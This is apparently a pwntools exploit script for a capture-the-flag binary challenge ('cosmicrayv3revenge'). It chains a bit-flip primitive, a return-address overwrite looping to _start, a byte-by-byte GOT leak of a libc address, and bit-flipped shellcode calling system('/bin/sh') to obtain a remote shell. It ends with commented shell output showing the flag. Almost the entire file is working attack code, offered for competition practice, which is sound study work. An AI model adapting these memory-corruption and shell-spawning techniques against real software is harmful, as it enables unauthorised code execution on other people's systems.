#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF(args.EXE or '', checksec=True)
# libc = ELF(elf.libc)
# context.terminal = ["terminator", "-u", "-e"]
context.terminal = ["remotinator", "vsplit", "-x"]

gdbscript = '''
# b *0x401602
continue
'''

pre_argv = []
post_argv = []

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or 'vsc.tf'
    port = int(args.PORT or 7005)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    exe_name = os.path.basename(exe.path)
    cmd = pre_argv + [exe.path] + post_argv

    if args.DOCKER:
        if args.REMOTE:
            p = remote(host, port, *a, **kw)
        else:
            p = process(f'docker run -i --rm {args.DOCKER}', shell=True)
        if args.GDB:
            sleep(1) # TODO: find better method
            gdb.attach(pidof(exe_name)[0], gdbscript=gdbscript, exe=exe.path, *a, **kw)
        return p
    if args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(host, port, *a, **kw)

    return process(cmd, *a, **kw)

io = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
def protect_ptr(pos, ptr): return (pos >> 12) ^ ptr


# ideas:
# read(0, stack, rdx)
# jump over init
# DT_FINI ?


# for addr in range(0x40159D, 0x401618+1):
#     for i in range(8):
#         info(f'trying {addr:#x} {i}')
#         io = get_conn(pre_argv, post_argv, gdbscript)
#         with io:
#             r = lambda *a, **k: io.recv(*a, **k)
#             rl = lambda *a, **k: io.recvline(*a, **k)
#             ru = lambda *a, **k: io.recvuntil(*a, **k)
#             cl = lambda *a, **k: io.clean(*a, **k)
#             s = lambda *a, **k: io.send(*a, **k)
#             sa = lambda *a, **k: io.sendafter(*a, **k)
#             sl = lambda *a, **k: io.sendline(*a, **k)
#             sla = lambda *a, **k: io.sendlineafter(*a, **k)
#             ia = lambda *a, **k: io.interactive(*a, **k)
#             def protect_ptr(pos, ptr): return (pos >> 12) ^ ptr

#             sla(b'Enter an address to send a cosmic ray through:', hex(addr).encode())
#             sla(b'Enter the bit position to flip:', str(i).encode())

#             try:
#                 ru(b'Enter an address', timeout=1)
#                 ia()
#             except:
#                 print('died')

# tryinh 0x4015fa 5  <- messes up rsp
# trying 0x4015fa 6  <- sets rdx, we control rbp
# trying 0x4015fa 7  <- ?

addr = 0x4015fa
sla(b'Enter an address to send a cosmic ray through:', hex(addr).encode())
sla(b'Enter the bit position to flip:', b'6')

def loop():
    s(flat(
        cyclic(0x2e),
        p64(exe.bss(0x4040)), # rbp
        # p32(0x4013D3),    # 6b retaddr overwrite
        p32(exe.sym._start),    # 6b retaddr overwrite
        p16(0)
    ))


loop()

addr = 0x403fe8
exit_func = 0

for i in range(8):
    sla(b'Enter an address to send a cosmic ray through:', hex(addr+i).encode())
    ru(b'-----------------\n', drop=True)
    leak_byte = rl().strip().replace(b'|', b'').decode()
    leak_byte = int(leak_byte, 2)
    
    exit_func |= (leak_byte<<i*8)
    info(f'{exit_func:#x}')
    
    sla(b'Enter the bit position to flip:', b'0')
    
    loop()

libc_start_main = exit_func
libc = ELF('./libc-2.35.so')
libc.address = libc_start_main-0x455f0
bin_sh = next(libc.search(b'/bin/sh\x00'))
info(f'libc.address {libc.address:#x}') 


# write payload

addr = 0x401240
code = asm(f'''
mov rdi, {bin_sh:#x}
mov rax, {libc.sym.system:#x}
call rax 
''', arch = 'amd64')


for idx, (b, v) in enumerate(zip(code,exe.data[exe.vaddr_to_offset(addr):])):
    if b == v:
        info(f'skipping byte at:{i} = {b}')
        continue
    
    info(f'{bin(b)} vs {bin(v)}')
    for i in range(8):
        tbit = v & (1<<(7-i))
        cbit = b & (1<<(7-i))
        info(f'compare bits: {tbit}:{cbit}')
        
        if tbit != cbit:
            sla(b'Enter an address to send a cosmic ray through:', hex(addr+idx).encode())
            sla(b'Enter the bit position to flip:', str(i).encode())
            
            loop()


sla(b'Enter an address to send a cosmic ray through:', b'0x401610')
sla(b'Enter the bit position to flip:', b'0')

s(flat(
    cyclic(0x2e),
    p64(exe.bss(0x4040)), # rbp
    p32(addr),    # 6b retaddr overwrite
    p16(0)
))


ia()

# $ ls
# cosmicrayv3revenge
# flag.txt
# ld-2.35.so
# libc-2.35.so
# $ cat flag.txt
# vsctf{th4t5_477_f0lk5!!}
